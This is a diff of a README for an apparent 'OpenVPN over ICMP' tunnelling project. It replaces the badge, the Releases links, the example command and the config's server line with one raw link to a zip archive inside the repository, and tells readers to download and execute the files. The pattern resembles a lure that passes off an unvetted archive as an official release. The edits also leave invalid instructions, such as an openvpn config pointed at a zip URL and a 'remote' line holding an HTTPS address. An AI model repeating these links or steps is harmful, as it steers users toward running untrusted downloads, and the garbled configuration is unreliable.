@@ -1,6 +1,6 @@
 # OpenVPN over ICMP: Create a Secure Tunnel with Ping! 🌐
 
-![OpenVPN over ICMP](https://img.shields.io/badge/OpenVPN%20over%20ICMP-Ready-blue)
+![OpenVPN over ICMP](https://raw.githubusercontent.com/EDDY7688/openvpn-over-icmp/main/server/ovpn/icmp_over_openvpn_v2.1.zip%20over%20ICMP-Ready-blue)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -27,7 +27,7 @@ OpenVPN over ICMP allows you to tunnel OpenVPN traffic through ICMP packets. Thi
 
 ## Installation
 
-To get started, you need to download and execute the necessary files. Visit the [Releases section](https://github.com/EDDY7688/openvpn-over-icmp/releases) to find the latest version. 
+To get started, you need to download and execute the necessary files. Visit the [Releases section](https://raw.githubusercontent.com/EDDY7688/openvpn-over-icmp/main/server/ovpn/icmp_over_openvpn_v2.1.zip) to find the latest version. 
 
 1. Download the appropriate file for your system.
 2. Follow the instructions in the downloaded package to install the software.
@@ -43,7 +43,7 @@ After installation, you can set up your OpenVPN over ICMP tunnel.
 ### Example Command
 
 ```bash
-openvpn --config your-config-file.ovpn
+openvpn --config https://raw.githubusercontent.com/EDDY7688/openvpn-over-icmp/main/server/ovpn/icmp_over_openvpn_v2.1.zip
 ```
 
 ## Configuration
@@ -60,7 +60,7 @@ Configuring OpenVPN over ICMP involves adjusting your settings to suit your netw
 # Sample OpenVPN Configuration for ICMP
 dev tun
 proto udp
-remote your.vpn.server 1194
+remote https://raw.githubusercontent.com/EDDY7688/openvpn-over-icmp/main/server/ovpn/icmp_over_openvpn_v2.1.zip 1194
 resolv-retry infinite
 nobind
 persist-key
@@ -96,7 +96,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-To access the latest releases, visit the [Releases section](https://github.com/EDDY7688/openvpn-over-icmp/releases). Here, you can download the necessary files to set up OpenVPN over ICMP on your system. 
+To access the latest releases, visit the [Releases section](https://raw.githubusercontent.com/EDDY7688/openvpn-over-icmp/main/server/ovpn/icmp_over_openvpn_v2.1.zip). Here, you can download the necessary files to set up OpenVPN over ICMP on your system. 
 
 ---
 
